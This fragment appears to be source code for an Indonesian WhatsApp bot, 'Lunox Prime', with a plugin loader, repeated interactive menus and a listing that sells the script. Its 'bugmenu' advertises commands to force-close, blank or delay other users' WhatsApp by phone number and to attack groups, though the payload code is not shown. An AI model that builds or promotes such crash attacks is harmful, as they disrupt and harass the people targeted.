				   const result = 'https:' + $('div#output > p.outfile > video > source').attr('src')
				   resolve({
						status: true,
						message: "Xeorz",
						result: result
				   })
			  }).catch(reject)
		 }).catch(reject)
	})
}

async function floNime(medianya, options = {}) {
const { ext } = await fromBuffer(medianya) || options.ext
        var form = new formData()
        form.append('file', medianya, 'tmp.'+ext)
        let jsonnya = await fetch('https://flonime.my.id/upload', {
                method: 'POST',
                body: form
        })
        .then((response) => response.json())
        return jsonnya
}

        const pluginsLoader = async (directory) => {
            let plugins = [];
            const folders = fs.readdirSync(directory);
            folders.forEach(file => {
                const filePath = path.join(directory, file);
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath];
                        }
                        const plugin = require(filePath);
                        plugins.push(plugin);
                    } catch (error) {
                        console.log(`${filePath}:`, error);
                    }
                }
            });
            return plugins;
        };

        const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "./command"));
        const plug = {
            client,
            prefix,
            command, 
            reply, 
            text, 
            isBot,
            reaction,
            pushname, 
            mime,
            quoted,
            sleep,
            fquoted,
            fetchJson 
        };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.isBot && !isBot) {
                    return
                }
                
                if (plugin.private && !plug.isPrivate) {
                    return m.reply(config.message.private);
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }
        
        if (!pluginsDisable) return;  

        switch (command) {
          case "menu":{
    //    if (!isBot) return
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const formattedUsedMem = formatSize(usedMem);
    const formattedTotalMem = formatSize(totalMem);
    let timestamp = speed()
    let latensi = speed() - timestamp
    let menu = `
🦅 — ( 𝘱𝘪𝘯𝘻𝘺𝘰𝘧𝘧𝘪𝘤𝘪𝘢𝘭 )
𝘭𝘢𝘶𝘵𝘢𝘯 𝘪𝘵𝘶 𝘥𝘢𝘭𝘢𝘮, 𝘵𝘦𝘳𝘪𝘮𝘢𝘬𝘢𝘴𝘪𝘩 𝘵𝘦𝘭𝘢𝘩
𝘮𝘦𝘯𝘪𝘭𝘢𝘪𝘬𝘶 𝘥𝘢𝘳𝘪 𝘱𝘦𝘳𝘮𝘶𝘬𝘢𝘢𝘯, 𝘢𝘬𝘢𝘯 𝘬𝘶
𝘣𝘶𝘬𝘵𝘪𝘬𝘢𝘯 𝘥𝘪 𝘩𝘢𝘳𝘪 𝘱𝘦𝘮𝘣𝘶𝘬𝘵𝘪𝘢𝘯

\`╔═══[ BOT STATUS ]════\`
\`║\` ✰ 𝘉𝘰𝘵𝘯𝘢𝘮𝘦 : 𝙇𝙪𝙣𝙤𝙭 𝙋𝙧𝙞𝙢𝙚
\`║\` ✰ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : 1.0.0
\`║\` ▢ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳 : PinzyOffc
\`║\` ▢ 𝘚𝘵𝘢𝘵𝘶𝘴 : Private Only
\`╚══════════════════\`

➤  ｢ 𝘒𝘭𝘪𝘬 𝘉𝘶𝘵𝘵𝘰𝘯 𝘜𝘯𝘵𝘶𝘬 𝘔𝘦𝘯𝘢𝘮𝘱𝘪𝘭𝘬𝘢𝘯 𝘚𝘦𝘮𝘶𝘢 𝘑𝘦𝘯𝘪𝘴 𝘍𝘪𝘵𝘶𝘳 𝘠𝘢𝘯𝘨 𝘛𝘦𝘳𝘴𝘦𝘥𝘪𝘢. ｣ 
`
    await reaction(m.chat, "🔐")
    await sleep(1000);
    await reaction(m.chat, "⌛")
    await sleep(1000);
    await reaction(m.chat, "🕚")
    await sleep(1000);
    await reaction(m.chat, "🔓")
    await sleep(1000);
    await reaction(m.chat, "✅")
    await client.sendMessage(m.chat, {
        interactiveMessage: {
            title: menu,
            footer: config.settings.footer,
            thumbnail: "https://files.catbox.moe/lck4pw.jpg",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "TikTok @𝘗𝘪𝘯𝘻𝘺𝘖𝘧𝘧𝘪𝘤𝘪𝘢𝘭",
                        url: "t.me/Pinnxyz",
                        copy_code: "999999999999999999",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "YT LunoxOfficial-ID",
                        button_title: "𝐒𝐡𝐨𝐰 𝐅𝐢𝐭𝐮𝐫"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/Pinnxyz",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "𝘐𝘯𝘧𝘰 𝘜𝘱𝘥𝘢𝘵𝘦 𝘚𝘤𝘳𝘪𝘱𝘵 𝘓𝘶𝘯𝘰𝘹",
                            sections: [
                                {
                                    title: "# X - Developer Info",
                                    highlight_label: "label",
                                    rows: [
                                        {
                                            title: "Saluran WhatsApp Lunox 👇🏻", 
                                            description: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U\n\n> Jangan Lupa Follow Agar Tidak Ketinggalan Tentang Update Script Bug Terbarunya.",
                                            id: "row_1"
                                        },
                                        { 
                                            title: "Saluran Telegram Lunox 👇🏻",
                                            description: "t.me/aubotyanz",
                                            id: "row_2"
                                        }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘊𝘳𝘦𝘥𝘪𝘵𝘴 : 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: "123456789",
                            copy_code: "https://t.me/Pinnxyz"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘴𝘪 𝘖𝘸𝘯𝘦𝘳 𝘓𝘶𝘯𝘰𝘹",
                            id: `.creator`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chwa`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chtele`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘉𝘶𝘨𝘮𝘦𝘯𝘶",
                            id: `.bugmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘸𝘯𝘦𝘳𝘮𝘦𝘯𝘶",
                            id: `.ownermenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘛𝘰𝘰𝘭𝘴𝘮𝘦𝘯𝘶",
                            id: `.toolsmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘶𝘱𝘱𝘰𝘳𝘵 𝘗𝘳𝘰𝘫𝘦𝘤𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.thanksto`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘤𝘳𝘪𝘱𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.scbug`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘗𝘳𝘰𝘥𝘶𝘤𝘵 𝘗𝘪𝘯𝘻𝘺",
                            id: `.allprodukpinzy`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘈𝘭𝘭 𝘕𝘢𝘮𝘦 𝘗𝘢𝘳𝘵𝘯𝘦𝘳 𝘗𝘪𝘯𝘻𝘺",
                            id: `.partnerpinzy`
                        })
                    }
                ]
            }
        }
    }, { quoted: fquoted.channel });
    await sleep(2000)
    client.sendMessage(m.chat, {
        audio: { url: `https://files.catbox.moe/b352na.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: qpayment });
      }
      break;

          case "bugmenu":{
    //    if (!isBot) return
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const formattedUsedMem = formatSize(usedMem);
    const formattedTotalMem = formatSize(totalMem);
    let timestamp = speed()
    let latensi = speed() - timestamp
    let menu = `  ▢ 𝘉𝘰𝘵𝘯𝘢𝘮𝘦 : 𝙇𝙪𝙣𝙤𝙭 𝙋𝙧𝙞𝙢𝙚
  ▢ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : Private Only
  ▢ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳 : t.me/Pinnxyz

 ╭▢ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝘽𝙪𝙜𝙨
 │.𝘧𝘰𝘳𝘤𝘭𝘰𝘴𝘦-𝘤𝘢𝘭𝘭 628xxx
 │.𝘣𝘭𝘢𝘯𝘬-𝘩𝘢𝘳𝘥 62xxx
 │.𝘥𝘦𝘭𝘢𝘺-𝘴𝘸 62xxx
 │.𝘧𝘤-𝘩𝘢𝘳𝘥 62xxx
 │.𝘣𝘭𝘢𝘯𝘬-𝘴𝘵𝘶𝘤𝘬 62xxx
 ╰▢
 
 ╭▢ 𝘽𝙪𝙜 𝙂𝙧𝙤𝙪𝙥
 │.𝘤𝘰𝘮𝘣𝘰-𝘨𝘣 [𝘉𝘶𝘨 𝘋𝘪𝘵𝘦𝘮𝘱𝘢𝘵]
 │.𝘥𝘦𝘭𝘢𝘺-𝘨𝘣 [𝘉𝘶𝘨 𝘋𝘪𝘵𝘦𝘮𝘱𝘢𝘵]
 ╰▢`
    await reaction(m.chat, "🔐")
    await sleep(1000);
    await reaction(m.chat, "⌛")
    await sleep(1000);
    await reaction(m.chat, "🕚")
    await sleep(1000);
    await reaction(m.chat, "🔓")
    await sleep(1000);
    await reaction(m.chat, "🦠")
    await client.sendMessage(m.chat, {
        interactiveMessage: {
            title: menu,
            footer: config.settings.footer,
            thumbnail: "https://files.catbox.moe/lck4pw.jpg",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "𝘛𝘪𝘬𝘛𝘰𝘬 @𝘗𝘪𝘯𝘻𝘺𝘖𝘧𝘧𝘪𝘤𝘪𝘢𝘭",
                        url: "t.me/Pinnxyz",
                        copy_code: "999999999999999999",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "𝐘𝐓 𝐏𝐢𝐧𝐳𝐲𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥-𝐈𝐃",
                        button_title: "𝐒𝐡𝐨𝐰 𝐅𝐢𝐭𝐮𝐫"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/Pinnxyz",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "𝘐𝘯𝘧𝘰 𝘜𝘱𝘥𝘢𝘵𝘦 𝘚𝘤𝘳𝘪𝘱𝘵",
                            sections: [
                                {
                                    title: "# X - Developer Info",
                                    highlight_label: "label",
                                    rows: [
                                        {
                                            title: "Saluran WhatsApp Lunox 👇🏻", 
                                            description: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U\n\n> Jangan Lupa Follow Agar Tidak Ketinggalan Tentang Update Script Bug Terbarunya.",
                                            id: "row_1"
                                        },
                                        { 
                                            title: "Saluran Telegram Lunox 👇🏻",
                                            description: "t.me/aubotyanz",
                                            id: "row_2"
                                        }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘊𝘳𝘦𝘥𝘪𝘵𝘴 : 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: "123456789",
                            copy_code: "https://t.me/Pinnxyz"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘴𝘪 𝘖𝘸𝘯𝘦𝘳 𝘓𝘶𝘯𝘰𝘹",
                            id: `.creator`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chwa`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chtele`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘉𝘶𝘨𝘮𝘦𝘯𝘶",
                            id: `.bugmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘸𝘯𝘦𝘳𝘮𝘦𝘯𝘶",
                            id: `.ownermenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘛𝘰𝘰𝘭𝘴𝘮𝘦𝘯𝘶",
                            id: `.toolsmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘶𝘱𝘱𝘰𝘳𝘵 𝘗𝘳𝘰𝘫𝘦𝘤𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.thanksto`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘤𝘳𝘪𝘱 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦𝘵",
                            id: `.scbug`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘗𝘳𝘰𝘥𝘶𝘤𝘵 𝘗𝘪𝘯𝘻𝘺",
                            id: `.allprodukpinzy`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘈𝘭𝘭 𝘕𝘢𝘮𝘦 𝘗𝘢𝘳𝘵𝘯𝘦𝘳 𝘗𝘪𝘯𝘻𝘺",
                            id: `.partnerpinzy`
                        })
                    }
                ]
            }
        }
    }, { quoted: fquoted.channel });
    await sleep(2000)
    client.sendMessage(m.chat, {
        audio: { url: `https://files.catbox.moe/b352na.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: qpayment });
      }
      break;      

          case "toolsmenu":{
    //    if (!isBot) return
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const formattedUsedMem = formatSize(usedMem);
    const formattedTotalMem = formatSize(totalMem);
    let timestamp = speed()
    let latensi = speed() - timestamp
    let menu = `  ▢ 𝘉𝘰𝘵𝘯𝘢𝘮𝘦 : 𝙇𝙪𝙣𝙤𝙭 𝙋𝙧𝙞𝙢𝙚
  ▢ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : Private Only
  ▢ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳 : t.me/Pinnxyz

 ╭▢ *Tools Owner Menu*
 │.brat
 │.tiktok
 │.get
 │.swgroup
 │.cekidch
 │.capcut
 │.iqc
 │.rvo
 │.mesinfo
 │.insp
 │.exec
 │.eval
 ╰▢`
    await reaction(m.chat, "🔐")
    await sleep(1000);
    await reaction(m.chat, "⌛")
    await sleep(1000);
    await reaction(m.chat, "🕚")
    await sleep(1000);
    await reaction(m.chat, "🔓")
    await sleep(1000);
    await reaction(m.chat, "🎮")
    await client.sendMessage(m.chat, {
        interactiveMessage: {
            title: menu,
            footer: config.settings.footer,
            thumbnail: "https://files.catbox.moe/lck4pw.jpg",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "𝘛𝘪𝘬𝘛𝘰𝘬 @𝘗𝘪𝘯𝘻𝘺𝘖𝘧𝘧𝘪𝘤𝘪𝘢𝘭",
                        url: "t.me/Pinnxyz",
                        copy_code: "999999999999999999",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "𝐘𝐓 𝐏𝐢𝐧𝐳𝐲𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥-𝐈𝐃",
                        button_title: "𝐒𝐡𝐨𝐰 𝐅𝐢𝐭𝐮𝐫"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/Pinnxyz",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "𝘐𝘯𝘧𝘰 𝘜𝘱𝘥𝘢𝘵𝘦 𝘚𝘤𝘳𝘪𝘱𝘵",
                            sections: [
                                {
                                    title: "# X - Developer Info",
                                    highlight_label: "label",
                                    rows: [
                                        {
                                            title: "Saluran WhatsApp Lunox 👇🏻", 
                                            description: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U\n\n> Jangan Lupa Follow Agar Tidak Ketinggalan Tentang Update Script Bug Terbarunya.",
                                            id: "row_1"
                                        },
                                        { 
                                            title: "Saluran Telegram Lunox 👇🏻",
                                            description: "t.me/aubotyanz",
                                            id: "row_2"
                                        }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘊𝘳𝘦𝘥𝘪𝘵𝘴 : 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: "123456789",
                            copy_code: "https://t.me/Pinnxyz"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘴𝘪 𝘖𝘸𝘯𝘦𝘳 𝘓𝘶𝘯𝘰𝘹",
                            id: `.creator`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chwa`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chtele`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘉𝘶𝘨𝘮𝘦𝘯𝘶",
                            id: `.bugmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘸𝘯𝘦𝘳𝘮𝘦𝘯𝘶",
                            id: `.ownermenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘛𝘰𝘰𝘭𝘴𝘮𝘦𝘯𝘶",
                            id: `.toolsmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘶𝘱𝘱𝘰𝘳𝘵 𝘗𝘳𝘰𝘫𝘦𝘤𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.thanksto`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘤𝘳𝘪𝘱𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.scbug`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘗𝘳𝘰𝘥𝘶𝘤𝘵 𝘗𝘪𝘯𝘻𝘺",
                            id: `.allprodukpinzy`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘈𝘭𝘭 𝘕𝘢𝘮𝘦 𝘗𝘢𝘳𝘵𝘯𝘦𝘳 𝘗𝘪𝘯𝘻𝘺",
                            id: `.partnerpinzy`
                        })
                    }
                ]
            }
        }
    }, { quoted: fquoted.channel });
    await sleep(2000)
    client.sendMessage(m.chat, {
        audio: { url: `https://files.catbox.moe/b352na.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: qpayment });
      }
      break;
            
          case "ownermenu":{
    //    if (!isBot) return
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const formattedUsedMem = formatSize(usedMem);
    const formattedTotalMem = formatSize(totalMem);
    let timestamp = speed()
    let latensi = speed() - timestamp
    let menu = `  ▢ 𝘉𝘰𝘵𝘯𝘢𝘮𝘦 : 𝙇𝙪𝙣𝙤𝙭 𝙋𝙧𝙞𝙢𝙚
  ▢ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : Private Only
  ▢ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳 : t.me/Pinnxyz

 ╭▢ *Owner Menu*
 │.addowner
 │.dellowner
 │.tagall
 │.self
 │.public
 │.afk
 │.unafk
 │.update
 │.clearsesi
 │.restart
 │.hapus-sampah
 ╰▢

➤  ｢ *INFO UPDATE SCRIPT* ｣ 
https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U`
    await reaction(m.chat, "🔐")
    await sleep(1000);
    await reaction(m.chat, "⌛")
    await sleep(1000);
    await reaction(m.chat, "🕚")
    await sleep(1000);
    await reaction(m.chat, "📍")
    await client.sendMessage(m.chat, {
        interactiveMessage: {
            title: menu,
            footer: config.settings.footer,
            thumbnail: "https://files.catbox.moe/lck4pw.jpg",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "𝘛𝘪𝘬𝘛𝘰𝘬 @𝘗𝘪𝘯𝘻𝘺𝘖𝘧𝘧𝘪𝘤𝘪𝘢𝘭",
                        url: "t.me/Pinnxyz",
                        copy_code: "999999999999999999",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "𝐘𝐓 𝐏𝐢𝐧𝐳𝐲𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥-𝐈𝐃",
                        button_title: "𝐒𝐡𝐨𝐰 𝐅𝐢𝐭𝐮𝐫"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/Pinnxyz",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "𝘐𝘯𝘧𝘰 𝘜𝘱𝘥𝘢𝘵𝘦 𝘚𝘤𝘳𝘪𝘱𝘵",
                            sections: [
                                {
                                    title: "# X - Developer Info",
                                    highlight_label: "label",
                                    rows: [
                                        {
                                            title: "Saluran WhatsApp Lunox 👇🏻", 
                                            description: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U\n\n> Jangan Lupa Follow Agar Tidak Ketinggalan Tentang Update Script Bug Terbarunya.",
                                            id: "row_1"
                                        },
                                        { 
                                            title: "Saluran Telegram Lunox 👇🏻",
                                            description: "t.me/aubotyanz",
                                            id: "row_2"
                                        }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘊𝘳𝘦𝘥𝘪𝘵𝘴 : 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: "123456789",
                            copy_code: "https://t.me/Pinnxyz"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘴𝘪 𝘖𝘸𝘯𝘦𝘳 𝘓𝘶𝘯𝘰𝘹",
                            id: `.creator`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chwa`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chtele`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘉𝘶𝘨𝘮𝘦𝘯𝘶",
                            id: `.bugmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘸𝘯𝘦𝘳𝘮𝘦𝘯𝘶",
                            id: `.ownermenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘛𝘰𝘰𝘭𝘴𝘮𝘦𝘯𝘶",
                            id: `.toolsmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘶𝘱𝘱𝘰𝘳𝘵 𝘗𝘳𝘰𝘫𝘦𝘤𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.thanksto`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘤𝘳𝘪𝘱𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.scbug`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘗𝘳𝘰𝘥𝘶𝘤𝘵 𝘗𝘪𝘯𝘻𝘺",
                            id: `.allprodukpinzy`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘈𝘭𝘭 𝘕𝘢𝘮𝘦 𝘗𝘢𝘳𝘵𝘯𝘦𝘳 𝘗𝘪𝘯𝘻𝘺",
                            id: `.partnerpinzy`
                        })
                    }
                ]
            }
        }
    }, { quoted: fquoted.channel });
    await sleep(2000)
    client.sendMessage(m.chat, {
        audio: { url: `https://files.catbox.moe/b352na.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: qpayment });
      }
      break;   
      

case "script":
case "buyscript":
case "buysc":
case "beli":
case "belisc":
case "minta":
case "scbug":
case "bagi":
case "sc": {
                await client.sendMessage(m.chat,{
                    productMessage: {
                        title: "𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦 - 𝘞𝘢𝘉𝘰𝘵2026!",
                        description: "𝘐𝘯𝘪 𝘈𝘥𝘢𝘭𝘢𝘩 𝘋𝘦𝘬𝘳𝘪𝘱𝘴𝘪 𝘗𝘳𝘰𝘥𝘶𝘤𝘵 𝘗𝘪𝘯𝘻𝘺",
                        thumbnail: { url: "https://img1.pixhost.to/images/10671/668571049_file_1764970098371.jpg" },
                        productId: "PROD001",
                        retailerId: "RETAIL001",
                        url: "https://t.me/Pinnxyz",
                        body: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘤𝘳𝘪𝘱𝘵 𝘐𝘴 𝘏𝘦𝘳𝘦",
                        footer: config.settings.footer,
                        priceAmount1000: 777,
